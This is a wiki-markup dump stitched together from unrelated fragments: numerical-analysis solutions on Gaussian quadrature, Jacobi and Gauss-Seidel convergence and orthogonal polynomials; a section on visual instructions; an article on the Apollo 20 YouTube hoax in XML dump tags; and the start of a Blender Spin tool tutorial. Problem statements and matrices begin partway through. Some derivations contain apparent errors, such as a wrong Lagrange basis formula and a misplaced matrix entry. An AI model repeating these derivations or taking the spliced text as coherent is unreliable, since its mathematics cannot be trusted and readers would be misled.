       &amp;= x^2 - \frac{5}{7}
\end{align}
&lt;/math&gt;

====Third Order Polynomial====
&lt;math&gt;
\begin{align}
P_3(x) &amp;= x^3 - \frac{\left \langle 1,x^3 \right \rangle}{\left \langle 1,1 \right \rangle}\cdot 1 
              - \frac{\left \langle x,x^3 \right \rangle}{\left \langle x,x \right \rangle}\cdot x 
              - \frac{\left \langle x^2 - \frac57,x^3 \right \rangle}{\left \langle x^2 - \frac{5}{7}, 
                x^2 - \frac{5}{7} \right \rangle}\cdot (x^2 - \frac{5}{7}) \\
       &amp;= x^3 - 0 - \frac72 x \cdot \frac{\int_{-1}^1 x^8 dx}{\int_{-1}^1 x^6 dx} - 0 \\
       &amp;= x^3 - \frac{7}{9} x
\end{align}
&lt;/math&gt;

====Find Roots of Polynomials====

The roots of these polynomials will be the interpolation nodes used in Gauss Quadrature.

&lt;math&gt; 
\begin{array}{|c|c|} \mbox{Polynomial} &amp; \mbox{Roots} \\
\hline
P_1(x) = x               &amp; 0\\ \\
P_2(x) = x^2 -\frac57    &amp; \pm \sqrt{\frac57}\\ \\
P_3(x) = x^3 -\frac79 x  &amp; 0, \pm \sqrt{\frac79}\\ \\
\hline
\end{array}
&lt;/math&gt;

===Formula to Compute Coefficients===

In Gaussian quadrature we have 

:&lt;math&gt;w_j = \int_{-1}^1 l_i(x)x^4 dx \!\,&lt;/math&gt;, where

:&lt;math&gt;l_i(x) = \prod_{j=1,j \ne i}^n \frac{x-x_j}{x_i-x_j} \!\,&lt;/math&gt;

====1 point formula====

&lt;math&gt; l_1(x) = 1 \!\,&lt;/math&gt;


&lt;math&gt;w_1 = \int_{-1}^1 x^4 dx = \frac25 \!\,&lt;/math&gt;



&lt;math&gt; \int_{-1}^1 f(x)x^4 dx \approx \frac25 f(x_1) \!\,&lt;/math&gt;

where &lt;math&gt;x_1 \!\,&lt;/math&gt; is the root of &lt;math&gt;P_1(x)\!\,&lt;/math&gt;.

====2 point formula====

&lt;math&gt; l_1(x) = \frac{x-x_1}{x_1-x_2} \!\,&lt;/math&gt;

&lt;math&gt; l_2(x) = \frac{x-x_1}{x_2-x_1} \!\,&lt;/math&gt;


&lt;math&gt; w_1 = \int_{-1}^1 \frac{x-x_1}{x_1-x_2} x^4 dx = \frac{2x_2}{5(x_2-x_1)} \!\,&lt;/math&gt;

&lt;math&gt; w_2 = \int_{-1}^1 \frac{x-x_1}{x_2-x_1} x^4 dx = \frac{2x_1}{5(x_1-x_2)} \!\,&lt;/math&gt;



&lt;math&gt; \int_{-1}^1 f(x)x^4 dx \approx w_1 f(x_1) + w_2 f(x_2) \!\,&lt;/math&gt;

where &lt;math&gt;x_1 \mbox{ and }x_2 \!\,&lt;/math&gt; are the roots of &lt;math&gt;P_2(x) \!\,&lt;/math&gt;.

====3 point formula====

&lt;math&gt; l_1(x) = \frac{x-x_2}{x_1-x_2} \frac{x-x_3}{x_1-x_3} \!\,&lt;/math&gt;

&lt;math&gt; l_2(x) = \frac{x-x_1}{x_2-x_1} \frac{x-x_3}{x_2-x_3} \!\,&lt;/math&gt;

&lt;math&gt; l_3(x) = \frac{x-x_1}{x_3-x_1} \frac{x-x_2}{x_3-x_2} \!\,&lt;/math&gt;


&lt;math&gt; w_1 = \int_{-1}^1 \frac{x-x_2}{x_1-x_2} \frac{x-x_3}{x_1-x_3} x^4 dx = \frac{1}{(x_1-x_2)(x_1-x_3)} \left( \frac27 + \frac{2x_2x_3}{5} \right) \!\,&lt;/math&gt;

&lt;math&gt; w_2 = \int_{-1}^1 \frac{x-x_1}{x_2-x_1} \frac{x-x_3}{x_2-x_3} x^4 dx = \frac{1}{(x_2-x_1)(x_2-x_3)} \left( \frac27 + \frac{2x_1x_3}{5} \right) \!\,&lt;/math&gt;

&lt;math&gt; w_3 = \int_{-1}^1 \frac{x-x_1}{x_3-x_1} \frac{x-x_2}{x_3-x_2} x^4 dx = \frac{1}{(x_3-x_1)(x_3-x_2)} \left( \frac27 + \frac{2x_1x_2}{5} \right) \!\,&lt;/math&gt;


&lt;math&gt; \int_{-1}^1 f(x)x^4 dx \approx w_1 f(x_1) + w_2 f(x_2) + w_3 f(x_3) \!\,&lt;/math&gt;

where &lt;math&gt;x_1 \mbox{, } x_2 \mbox{ and }x_3 \!\,&lt;/math&gt; are the roots of &lt;math&gt;P_3(x) \!\,&lt;/math&gt;.

===Derive Error Bound===
We know that this quadrature is exact for all polynomials  of degree at most &lt;math&gt;2n-1 \!\,&lt;/math&gt;. 


We choose a polynomial &lt;math&gt; p\!\,&lt;/math&gt; of degree at most &lt;math&gt;2n-1 \!\,&lt;/math&gt; that Hermite interpolates i.e.


&lt;math&gt;p(x_i)=f(x_i) \quad p'(x_i)=f'(x_i) \quad (0\leq i \leq n-1) \!\,&lt;/math&gt;


The error for this interpolation is 


&lt;math&gt;f(x)-p(x)=\frac{f^{(2n)}(\zeta(x))}{(2n)!} \prod_{i=0}^{n-1}(x-x_i)^2 \!\,&lt;/math&gt;


Compute the error of the quadrature as follows:


&lt;math&gt; 
\begin{align}
E &amp;= \int_{-1}^1 f(x)x^4dx - \sum_{i=0}^{n-1} w_i f(x_i) \\
  &amp;= \int_{-1}^1 f(x)x^4dx - \sum_{i=0}^{n-1} w_i p(x_i) \\
  &amp;= \int_{-1}^1 f(x)x^4dx - \int_{-1}^1  p(x) x^4 dx \\
  &amp;= \int_{-1}^1 (f(x)-p(x)) x^4dx  \\
  &amp;= \int_{-1}^1 \frac{f^{(2n)}(\zeta(x))}{(2n)!} \prod_{i=0}^{n-1}(x-x_i)^2 \cdot x^4 dx \\
  &amp;= \frac{f^{(2n)}(\xi)} {(2n)!} \int_{-1}^1  x^4 \cdot \underbrace{\prod_{i=0}^{n-1}(x-x_i)^2}_{(p_n(x))^2} dx
\end{align}
\!\,&lt;/math&gt;


where the last line follows from the mean value theorem of integrals.


Notice that &lt;math&gt;p_n(x)\!\,&lt;/math&gt; is simply the polynomials orthogonal with respect to weight function since &lt;math&gt; x_i\!\,&lt;/math&gt; are the roots of the polynomials.


Hence, the error for 1 point gaussian quadrature is


&lt;math&gt;
\begin{align}
E &amp;=  \frac{f^{(2)}(\xi)} {(2)!} \int_{-1}^1  x^4 \cdot x^2 dx \\
  &amp;= \frac{f^{(2)}(\xi)} {7} 
\end{align}
\!\,&lt;/math&gt;


The error for 2 point quadrature:


&lt;math&gt;
\begin{align}
E &amp;=  \frac{f^{(4)}(\xi)} {(4)!} \int_{-1}^1  x^4 \cdot (x^2-\frac57)^2 dx 
\end{align}
\!\,&lt;/math&gt;


The error for 3 point quadrature:


&lt;math&gt;
\begin{align}
E &amp;=  \frac{f^{(6)}(\xi)} {(6)!} \int_{-1}^1  x^4 \cdot (x^3-\frac79x)^2 dx 
\end{align}
\!\,&lt;/math&gt;

We wish to solve &lt;math&gt; Ax = b \!\,&lt;/math&gt; iteratively where


&lt;math&gt;

1 &amp; 1 &amp; -1 \\

Show that for this &lt;math&gt; A\!\,&lt;/math&gt; the Jacobi method and the Gauss-Seidel method both converge. Explain why for this &lt;math&gt; A\!\,&lt;/math&gt; one of these methods is better than the other.
|}

==Solution 2==

===Jacobi Method===
Decompose &lt;math&gt;A \!\,&lt;/math&gt; into its diagonal, lower, and upper parts i.e.


&lt;math&gt;A=D+(L+U) \!\,&lt;/math&gt;


Derive Jacobi iteration by solving for x as follows:


&lt;math&gt; 
\begin{align}
Ax &amp; =b \\
(D+(L+U))x &amp;= b\\
Dx+(L+U)x  &amp;= b\\
Dx         &amp;= b-(L+U)x \\
         x &amp;= D^{-1}(b-(L+U)x)
\end{align}
\!\,&lt;/math&gt;

===Gauss-Seidel Method===
Decompose &lt;math&gt;A \!\,&lt;/math&gt; into its diagonal, lower, and upper parts i.e.


&lt;math&gt;A=(D+L)+U \!\,&lt;/math&gt;


Derive Gauss-Sediel iteration by solving for x as follows:


&lt;math&gt; 
\begin{align}
Ax &amp; =b \\
((D+L)+U)x &amp;= b\\
(D+L)x+Ux  &amp;= b\\
(D+L)x     &amp;= b-Ux \\
         x &amp;= (D+L)^{-1}(b-Ux)
\end{align}
\!\,&lt;/math&gt;

===Jacobi Convergence===
Convergence occurs for the Jacobi iteration if the spectral radius of &lt;math&gt; D^{-1}(L+U)\!\,&lt;/math&gt; is less than 1 i.e.


&lt;math&gt;\rho(D^{-1}(L+U)) &lt; 1 \!\,&lt;/math&gt;


The eigenvalues of the matrix 


&lt;math&gt;
D^{-1}(L+U) = 
\begin{bmatrix}
0 &amp; 1 &amp; -1 \\
\frac12 &amp; 0 &amp;\frac12 \\
1 &amp;  1 &amp;   0 
\end{bmatrix}
\!\,&lt;/math&gt;


are &lt;math&gt;\lambda=0,0,0 \!\,&lt;/math&gt; i.e. the eigenvalue &lt;math&gt; 0\!\,&lt;/math&gt; has order 3.


Therefore, the spectral radius is &lt;math&gt;\rho=0 &lt;1 \!\,&lt;/math&gt;.

===Gauss-Seidel Convergence===
Convergence occurs for the Gauss-Seidel iteration if the spectral radius of &lt;math&gt; (D+L)^{-1}U\!\,&lt;/math&gt; is less than 1 i.e.


&lt;math&gt;\rho((D+L)^{-1}U) &lt; 1 \!\,&lt;/math&gt;


The eigenvalues of the matrix 


&lt;math&gt;
(D+L)^{-1}U = 
\begin{bmatrix}
0 &amp; 1        &amp; -1 \\
0 &amp; -\frac12 &amp;  1 \\
0 &amp; -\frac12 &amp;  0 
\end{bmatrix}
\!\,&lt;/math&gt;


are &lt;math&gt;\lambda=0,-\frac14+\frac{\sqrt{7}i}{4},-\frac14-\frac{\sqrt{7}i}{4} \!\,&lt;/math&gt;

Therefore, the spectral radius is &lt;math&gt;\rho=\sqrt{\frac{1}{16}+\frac{7}{16}}=\frac{\sqrt{2}}{2} \approx .7 &lt;1 \!\,&lt;/math&gt;.

===Comparison of Methods===
In general, the Gauss-Seidel iteration converges faster than the Jacobi iteration since Gauss-Seidel uses the new components of &lt;math&gt; x_i \!\,&lt;/math&gt; as they become available, but in this case &lt;math&gt; \rho_{Jacobi} &lt; \rho_{Gauss-Seidel} \!\, &lt;/math&gt;, so the Jacobi iteration is faster.

Prove that each &lt;math&gt; p_k(x) \!\, &lt;/math&gt; is a monic polynomial of degree &lt;math&gt;k\!\, &lt;/math&gt;, and for every &lt;math&gt;n = 0,1,\dots \!\,&lt;/math&gt;, one has

:&lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x), \dots, p_n(x) \right\} = \mbox{span}\left\{ 1,x,x^2,\dots,x^n \right\}  \!\,&lt;/math&gt;  


|}

==Solution 3a==
We prove the claim by by induction.

===Base Case===
&lt;math&gt; p_0(x) = 1 \!\,&lt;/math&gt; is monic with degree zero, and &lt;math&gt;\mbox{span}\left\{ p_0(x) \right\} = \mbox{span}\left\{ 1 \right\} \!\,&lt;/math&gt;.


&lt;math&gt; p_1(x) = x-\mu_0 \!\,&lt;/math&gt; is monic with degree one, and &lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x) \right\} = \mbox{span}\left\{ 1,x \right\} \!\,&lt;/math&gt;.


&lt;math&gt; p_2(x) = (x-\mu_0)(x-\mu_1) - \nu_1^2 \!\,&lt;/math&gt; is monic with degree 2, and &lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x),p_2(x) \right\} = \mbox{span}\left\{ 1,x,x^2 \right\} \!\,&lt;/math&gt;.

===Induction Step===
Assume &lt;math&gt; p_{k-1}(x)\!\,&lt;/math&gt; is monic with degree &lt;math&gt;k-1 \!\,&lt;/math&gt;, and &lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x),\dots,p_{k-1}(x) \right\} = \mbox{span}\left\{ 1,x,\dots,x^{k-1} \right\} \!\,&lt;/math&gt;.


Also,assume &lt;math&gt; p_k(x) \!\,&lt;/math&gt;is monic with degree &lt;math&gt;k \!\,&lt;/math&gt;, and &lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x),\dots,p_{k}(x) \right\} = \mbox{span}\left\{ 1,x,\dots,x^{k} \right\} \!\,&lt;/math&gt;.


Then from the hypothesis, &lt;math&gt; p_{k+1}(x) = (x-\mu_k)p_k(x) - \nu_k^2p_{k-1}(x) \!\,&lt;/math&gt; is monic with degree &lt;math&gt;k+1 \!\,&lt;/math&gt;.


Also,


&lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x),\dots,p_{k+1}(x) \right\} = \mbox{span}\left\{ 1,x,\dots,x^{k+1} \right\} \!\,&lt;/math&gt; 


since &lt;math&gt;p_{k+1}(x) \!\,&lt;/math&gt; is just &lt;math&gt;x^{n+1} \!\,&lt;/math&gt; plus a linear combination of lower order terms already in &lt;math&gt; \mbox{span}\left\{ 1,x,\dots,x^{k} \right\} \!\,&lt;/math&gt;.

Show that for every  &lt;math&gt;k = 0,1,\dots \!\,&lt;/math&gt; the polynomial &lt;math&gt;p_k(x) \!\, &lt;/math&gt; has &lt;math&gt; k \!\,&lt;/math&gt; simple real roots that interlace with the roots of &lt;math&gt;p_{k-1}(x) \!\,&lt;/math&gt;.

|}

==Solution 3b==

We prove the claim by induction.

===Base Case===

Let's consider the case &lt;math&gt;k=2 \!\,&lt;/math&gt;. We know that
 

&lt;math&gt; p_2(x)=(x-\mu_0)(x-\mu_1)-\nu_{1}^2. \!\,&lt;/math&gt;


The quadratic formula shows that &lt;math&gt;p_2(x)\!\,&lt;/math&gt; has two simple real roots. 


Let &lt;math&gt; r_{21} \!\,&lt;/math&gt; and &lt;math&gt; r_{22}\!\,&lt;/math&gt; be the zeros of &lt;math&gt;p_2(x)\!\,&lt;/math&gt;. Then, we have (because of sign changes) that


&lt;math&gt; p_2(\mu_0)=-\nu_1^2 \!\,&lt;/math&gt; and &lt;math&gt; \lim_{x \rightarrow \infty} p_2(x)&gt;0 \!\,&lt;/math&gt; &lt;math&gt; \Rightarrow \!\,&lt;/math&gt; there exists &lt;math&gt; r_{22} \in (\mu_0,\infty) \!\,&lt;/math&gt; such that &lt;math&gt;p_2(r_{22})=0\!\,&lt;/math&gt;.

&lt;math&gt; p_2(\mu_0)=-\nu_1^2 \!\,&lt;/math&gt; and &lt;math&gt; \lim_{x \rightarrow -\infty} p_2(x)&gt;0 \!\,&lt;/math&gt; &lt;math&gt; \Rightarrow \!\,&lt;/math&gt; there exists &lt;math&gt; r_{21} \in (-\infty,\mu_0) \!\,&lt;/math&gt; such that &lt;math&gt;p_2(r_{21})=0\!\,&lt;/math&gt;.


In conclusion, &lt;math&gt;  r_{21} &lt; \underbrace{\mu_0}_{r_{11}} &lt; r_{22}. \!\,&lt;/math&gt;.

===Induction Step===
Let  &lt;math&gt; r_{k-1,1}, \dots, r_{k-1,k-1}\!\,&lt;/math&gt; and &lt;math&gt; r_{k,1}, \dots, r_{k,k}\!\,&lt;/math&gt; be the simple real roots of &lt;math&gt; p_{k-1}(x)\!\,&lt;/math&gt; and &lt;math&gt; p_k(x)\!\,&lt;/math&gt;, respectively, such that the roots of &lt;math&gt; p_{k}\!\,&lt;/math&gt; are interlaced with the roots of &lt;math&gt; p_{k-1}\!\,&lt;/math&gt;, i.e.,


&lt;math&gt; r_{k,1} &lt; r_{k-1,1} &lt; r_{k,2} &lt; r_{k-1,2} &lt; \dots &lt; r_{k-1,k-1} &lt; r_{k,k}. \!\,&lt;/math&gt;


Then, we have that 


&lt;math&gt; p_{k+1}(r_{k,1})= (r_{k,1} -\mu_k) \underbrace{p_k(r_{k,1})}_0   -\nu_k^2 p_{k-1} (r_{k,1}) = -\nu_k^2 p_{k-1} (r_{k,1}),\!\,&lt;/math&gt;


&lt;math&gt; p_{k+1}(r_{k,2})= (r_{k,2} -\mu_k) \underbrace{p_k(r_{k,2})}_0   -\nu_k^2 p_{k-1} (r_{k,2}) = -\nu_k^2 p_{k-1} (r_{k,2}).\!\,&lt;/math&gt;


From the induction hypothesis &lt;math&gt; p_{k-1}(r_{k,1})\!\,&lt;/math&gt; and &lt;math&gt; p_{k-1}(r_{k,2})\!\,&lt;/math&gt; have different signs since &lt;math&gt; r_{k,1}&lt; r_{k-1,1} &lt; r_{k,2}\!\,&lt;/math&gt;. Then, there exists &lt;math&gt; r_{k+1,1} \in (r_{k,1},r_{k,2}) \!\,&lt;/math&gt;  such that &lt;math&gt; p_{k+1}(r_{k+1,1})=0\!\,&lt;/math&gt;. 


Proceeding in the same manner for all the intervals &lt;math&gt; (r_{k,j},r_{k,j+1}) \!\,&lt;/math&gt;, we obtain that there exists &lt;math&gt; r_{k+1,j} \in (r_{k,j},r_{k,j+1}) \!\,&lt;/math&gt; such that &lt;math&gt; p_{k+1}(r_{k+1,j})=0\!\,&lt;/math&gt; for &lt;math&gt; j=1,\dots,k-1.\!\,&lt;/math&gt;


We now consider the smallest and largest roots of &lt;math&gt;p_{k+1}\!\,&lt;/math&gt; i.e. &lt;math&gt;r_{k+1,0}, r_{k+1,k+1} \!\,&lt;/math&gt;


Since for &lt;math&gt;k=0,1,2,\ldots \!\,&lt;/math&gt;, &lt;math&gt;p_k \!\,&lt;/math&gt; is a monic polynomial, 


&lt;math&gt;\lim_{x \rightarrow \infty} p_k(x) = \infty \!\,&lt;/math&gt;


Hence for any &lt;math&gt;x &gt; r_k \!\,&lt;/math&gt; (any &lt;math&gt; x\!\,&lt;/math&gt; larger than the largest root of &lt;math&gt; p_k \!\,&lt;/math&gt;)


&lt;math&gt;p_k(x) &gt; 0 \!\,&lt;/math&gt;


Therefore


&lt;math&gt; \lim_{x \rightarrow \infty} p_{k+1}(x)&gt;0 \!\,&lt;/math&gt; and &lt;math&gt; p_{k+1}(r_{k,k})= -\nu_k^2 p_{k-1} (r_{k,k}) &lt; 0,\!\,&lt;/math&gt; 


implies there exists &lt;math&gt; r_{k+1,k} \in (r_{k,k},\infty) \!\,&lt;/math&gt; such that &lt;math&gt;p_{k+1}(r_{k+1,k})=0\!\,&lt;/math&gt;.


If &lt;math&gt;k+1 \!\,&lt;/math&gt; is even, then by similar reasoning

 
&lt;math&gt; \lim_{x \rightarrow -\infty} p_{k+1}(x)&gt;0 \!\,&lt;/math&gt; and &lt;math&gt; p_{k+1}(r_{k,1})= -\nu_k^2 p_{k-1} (r_{k,1}) &lt; 0,\!\,&lt;/math&gt; &lt;math&gt; \Rightarrow \!\,&lt;/math&gt; there exists &lt;math&gt; r_{k+1,0} \in (-\infty,r_{k,1}) \!\,&lt;/math&gt; such that &lt;math&gt;p_{k+1}(r_{k+1,0})=0\!\,&lt;/math&gt;.


If &lt;math&gt;k+1 \!\,&lt;/math&gt; is odd, 

 
&lt;math&gt; \lim_{x \rightarrow -\infty} p_{k+1}(x)&lt;0 \!\,&lt;/math&gt; and &lt;math&gt; p_{k+1}(r_{k,1})= -\nu_k^2 p_{k-1} (r_{k,1}) &gt; 0,\!\,&lt;/math&gt; &lt;math&gt; \Rightarrow \!\,&lt;/math&gt; there exists &lt;math&gt; r_{k+1,0} \in (-\infty,r_{k,1}) \!\,&lt;/math&gt; such that &lt;math&gt;p_{k+1}(r_{k+1,0})=0\!\,&lt;/math&gt;.

Show that for every &lt;math&gt;n = 0,1,\dots \!\,&lt;/math&gt; the roots of &lt;math&gt;p_{k+1}(x) \!\,&lt;/math&gt; are the eigenvalues of the symmetric tridiagonal matrix


:&lt;math&gt;
T =

   0  &amp; \nu_2 &amp; \nu_2 &amp; \ddots &amp;   0     \\
\vdots &amp; \ddots &amp; \ddots &amp; \ddots &amp; \nu_n\\
   0  &amp; \cdots &amp;   0  &amp; \nu_n  &amp; \mu_n
\end{pmatrix}
&lt;/math&gt;

==Solution 3c==

Let &lt;math&gt;
T_{n+1} =
\begin{pmatrix}
\mu_0 &amp; \nu_1 &amp;   0   &amp; \cdots &amp;   0     \\
\nu_1 &amp; \mu_1 &amp; \nu_2 &amp; \ddots &amp; \vdots  \\
   0  &amp; \nu_2 &amp; \nu_2 &amp; \ddots &amp;   0     \\
\vdots &amp; \ddots &amp; \ddots &amp; \ddots &amp; \nu_n\\
   0  &amp; \cdots &amp;   0  &amp; \nu_n  &amp; \mu_n
\end{pmatrix}
&lt;/math&gt;


Then &lt;math&gt;\mbox{det}(xI_{n+1} - T_{n+1}) \!\,&lt;/math&gt; is a monic polynomial in &lt;math&gt;x \!\,&lt;/math&gt; of degree &lt;math&gt;n+1 \!\,&lt;/math&gt;.



Expanding this determinant along the last row, we have


:&lt;math&gt; \mbox{det}(xI_{n+1} - T_{n+1}) = (x-\mu_{n})\mbox{det}(xI_{n} - T_{n}) - \nu_n^2 \mbox{det}(xI_{n-1} - T_{n-1}) \qquad (1) \!\,&lt;/math&gt;


where &lt;math&gt; \mbox{det}(xI_{n} - T_{n}) \!\,&lt;/math&gt; and &lt;math&gt; \mbox{det}(xI_{n-1} - T_{n-1}) \!\,&lt;/math&gt; are monic polynomials of degree &lt;math&gt;n \!\,&lt;/math&gt; and &lt;math&gt;n-1 \!\,&lt;/math&gt;, respectively.


Notice that &lt;math&gt; \mbox{det}(xI_{1} - T_{1}) = x-\mu_0 \equiv p_1(x) \!\,&lt;/math&gt; and if we let &lt;math&gt;p_0(x) \equiv 1\!\,&lt;/math&gt;, then (1) is equivalent to the three-term recurrence stated in the problem. 


Thus, &lt;math&gt;p_{n+1}(x) \equiv \mbox{det}(xI_{n+1}-T_{n+1}) = 0 \!\,&lt;/math&gt; shows that the roots of &lt;math&gt;p_{n+1}(x) \!\,&lt;/math&gt; are the eigenvalues of &lt;math&gt;T_{n+1} \!\,&lt;/math&gt;.

== The Value of Visual Instructions ==

Visual instructions may or may not include text. Generally, it is good to have both being that there are different learning styles. However, it can often vary depending on the intended use of the instructions. Visual instructions serve to clarify a concept that is difficult to explain using only words. Graphics may be used to show how something looks, how something should look once the step has been completed, how something is done or constructed, show trends or relationships, add liveliness to the project or simply organize information. Graphics are useful since almost everyone (including children and others of a different language) can understand visual instructions. It also eliminates the cost of having to translate and print text instructions in multiple languages. Graphics are useful in instructions because people can see exactly what they need to complete.   

===&lt;u&gt;Business and Marketing:&lt;/u&gt;===
*Minimize language barriers.
*Speeds up the learning curves.
*Minimize human variability.
*Increase instruction use rate and comprehension      
*Reduce product returns.
*Decrease assembly time- increase customer satisfaction
*Ease technical support.
*Visualize and generalize data into understandable trends
*Increase integrity of reports and memos
*Promote professionalism
*Ensure universal understanding

===&lt;u&gt;Academia:&lt;/u&gt;===
*Make abstract ideas visible and concrete.
*Connect prior knowledge and new concepts.
*Provide structure for thinking, writing, discussing, analyzing, planning, and reporting.
*Focus thoughts and ideas, leading to understanding and interpretation.
*Help students to clarify thoughts, organize and analyze information, integrate new knowledge, and think critically.

==History==

Graphics have been used for communicating a message or story &lt;u&gt;long&lt;/u&gt; before written text. Graphics have a deeper impact across cultures due to their ability to create their own meaning from the picture not words. Although words may be a part of the Graphic, the images themselves produce the desired response or understanding in the intended audience. Cave paintings and maps are some of the oldest that we know of and anyone that looks upon them can see what the graphic means and what it is for. A map from today would naturally look different from one in the 18th century, but the message would still be the same. The sea routes from England to Africa or the Caribbean would consist of different names, boundaries, and possessions but the audience would still find the same meaning.

== Common Problems with Visual Instructions ==
{| style=&quot;padding:2px; text-align:left; float:right;&quot;
 | [[Image:Visualinstructions.jpeg|thumb|An example of visual instructions.]]
 |}

While there are a number of benefits of visual instructions, there are also some drawbacks. When there are no words included people may interpret graphics differently. Some graphics can be unclear, and this can confuse the intended audience if the process is very detailed and requires pieces that look identical. When the pictures include a lot of different peices it is also necessary to zoom in on difficult parts in order to see them better. Also, if each peice is not drawn to scale, then a circle could represent the top of a table or a washer. There are also certain graphics that not everyone understands. If you work in a field that employs specialized graphics, use these graphics only when communicating with readers in your field who will understand and expect them. If you are using the graphics for a wide audience (such as a board game that may be used for young children to senior citizes), make sure that the graphics you choose can be understood by all.

      <comment>/* The hoax */</comment>
      <text xml:space="preserve">The '''Apollo 20 hoax''' is a story told in a series of [[wikipedia:YouTube|YouTube]] videos of a phony manned [[wikipedia:lunar mission|lunar mission]] whose purpose was to retrieve ancient [[wikipedia:Extraterrestrial life|alien]] artifacts from the [[wikipedia:moon|moon]]. Thierry Speth, a French video artist, claimed to be the perpetrator of the hoax on 9 July 2007 on Need2Know.eu, an [[wikipedia:Internet forum|internet bulletin board]].&lt;ref&gt;[http://www.need2know.eu/?p=72 Thierry Speth's admission on Need2Know]&lt;/ref&gt; However, no news organization has ever attempted to verify Speth's claim. The videos have drawn over 200,000 views since their appearance on YouTube. 

Two months after Thierry Speth's claim, another new Apollo 20 [[wikipedia:YouTube|YouTube]] video was posted by another unclaimed youtube user &quot;moonwalker1966delta&quot;.&lt;ref&gt;[http://www.youtube.com/user/moonwalker1966delta/videos New Apollo 20 video poster &amp; youtube user: moonwalker1966delta]&lt;/ref&gt;

==The hoax==
In April, 2007 a series of videos began appearing on YouTube under the username retiredafb telling the story of [[Apollo program|Apollo]] 20.&lt;ref&gt;[http://www.youtube.com/user/retiredafb The site of William Rutledge's YouTube account]&lt;/ref&gt;  Then on 23 May 2007, Italian [[wikipedia:ufology|ufologist]] Luca Scantanburlo interviewed somebody who identified himself as William Rutledge who claimed to be the commander of the Apollo 20 crew. Rutledge also claimed to be the account owner of retiredafb. However, Scantanburlo never met Rutledge in person because he conducted the interview over [[Yahoo! Messenger ]].&lt;ref&gt;[http://www.angelismarriti.it/ANGELISMARRITI-ENG/REPORTS_ARTICLES/Apollo20-InterviewWithWilliamRutledge.htm Luca Scantamburlo's interview with William Rutledge]&lt;/ref&gt;

During the interview, Rutledge claimed Apollo 20 was a top-secret mission launched in mid August of 1976 from [[Vandenberg Air Force Base]] in Santa Barbara, [[California]] and conducted jointly by the United States and the former [[Soviet Union]]. He said the other mission members were American Leona Snyder (an apparently fictitious person) and former Soviet cosmonaut [[Aleksei Leonov]], the first human being to walk in space. The purported lunar landing site of the mission was near [[Delporte crater]] on [[Far side of the Moon|the far side of the moon]]. Rutledge said the videos show that he and Leonov discovered the remains of an ancient lunar civilization.&lt;ref&gt;[http://www.youtube.com/watch?v=Y3X5oucqQe4 Apollo 20: alien spacecraft of the moon]&lt;/ref&gt;&lt;ref&gt;[http://www.youtube.com/watch?v=pXQu34KdYbg Apollo 20: alien artifacts on the moon]&lt;/ref&gt; He also said they brought back artifacts to earth for study, including a hibernating female alien.

Two months later, some unknown sources spreaded the message of a video artist Speth who claimed the responsibility for the hoax and explained that the entire story was fabricated.

==YouTube videos==
The hoaxer began posting the videos on [[April Fool's Day]], a hint that the story was nothing more than an elaborate prank. He/she has since moved most of the videos to [[Revver.com]] under the same username (retiredafb).&lt;ref&gt;[http://www.revver.com/u/retiredafb Apollo 20 videos on Revver.com]&lt;/ref&gt; However, others are scattered throughout YouTube posted by several account users, thereby making it difficult to determine the true identity of the hoaxer. Each continues to draw thousands of views. 

Despite the realistic appearance of the videos, amateurs have easily debunked them on YouTube and elsewhere on the internet.{{Fact|date=February 2009}}

The videos are short, each only lasting a couple of minutes. If viewed in their intended sequence, they tell a partial story of the mission, starting with astronauts boarding Apollo 20 and ending with the extraordinary &quot;discoveries&quot; on the moon. They include the following images:

*Ruins of an alien spacecraft
*Ruins of an alien city &lt;ref&gt;[http://www.revver.com/video/624300/apollo-20-legacy-part-1-the-city/ Ruins of an alien city]&lt;/ref&gt;
*The body of a hibernating female alien &lt;ref&gt;[http://www.revver.com/video/797241/apollo-20-ebe-mona-lisa-16-mm-film Fabricated video of a hibernating female alien]&lt;/ref&gt;
*Apollo 20 flight plans and mission patches
*The launch of Apollo 20
*William Rutledge walking on the moon &lt;ref&gt;[http://www.youtube.com/watch?v=a-A8RmnWaG0&amp;feature=related William Rutledge walking on the moon]&lt;/ref&gt;


==The truth behind the hoax==
Like many hoaxes, this story is a mixture of facts and fiction. The starting point for it are photos that [[Apollo 15]] astronauts took while in lunar orbit. The photos show what look like a cigar-shaped object resting in a crater. The hoaxer used these photos to create the image of pock-marked alien spacecraft on the moon. The NASA photos are real.&lt;ref&gt;[http://www.lpi.usra.edu/resources/apollo/frame/?AS15-P-9625 Apollo 15 photos of Delporte area]&lt;/ref&gt; However, NASA never claimed they include images of alien spacecraft. The object in question is nothing more than a natural part of the lunar terrain.

In truth, Apollo 20 was a mission that never got off the ground -- literally. It was one of three lunar missions NASA cancelled due to lack of funding along with Apollos 18 and 19. The last NASA lunar mission was [[Apollo 17]], launched in 1972. The next Apollo mission was the [[Apollo-Soyuz Test Project]] coordinated by the United States and the former Soviet Union in 1975. However, its mission was to remain in low earth orbit and to dock with a [[Soviet]] [[Soyuz (spacecraft)|Soyuz spacecraft]], something it accomplished successfully. Some mistakenly refer to that mission as Apollo 18. 

Some of the [[Multistage rocket|stages]] for the [[Saturn V]] rockets intended for NASA’s three cancelled lunar missions had already been constructed before their cancellation. According to the hoaxer's story, these were all used on lunar missions for Apollos 18, 19 and 20. In reality NASA used one of these to launch [[Skylab]] into orbit in 1973. The others are on display at three American space centers: the [[John F. Kennedy Space Center]] near Cape Canaveral, Florida; the [[Johnson Space Center]] in Houston, Texas and the [[United States Space &amp; Rocket Center]] in Huntsville, Alabama.

==How the Spin Tool Works==
The Spin tool works by making copies of the selected vertices in a radial array around an axis indicated by the 3d cursor. Each copies of vertices are connected to previous vertices that corresponds to it with necessary geometry, i.e. edges and planes.

A picture explains this more clearly.

[[Image:BeforeSpining.png|thumb|center|603px|Selected vertices before using the Spin tool]]

[[Image:AfterSpinning.png|thumb|center|562px|Result after using the Spin tool]]

Note that the copied vertices are arranged in a radial array around our 3d cursor and parallel to our view plane.

==Typical Work Flow==
1) Make half of the outline of our object with connected vertices. If you want to model a wineglass, make the half of the outline of the wineglass.

2) Spin our outline. After this the Spin tool would complete our object.

3) Clean up the resulting mesh. The mesh created by the Spin tool is not so perfect so we had to &quot;clean&quot; it up.

====Modeling Half of the Outline====
To start we make half of the outline. Here we do it by creating vertices.

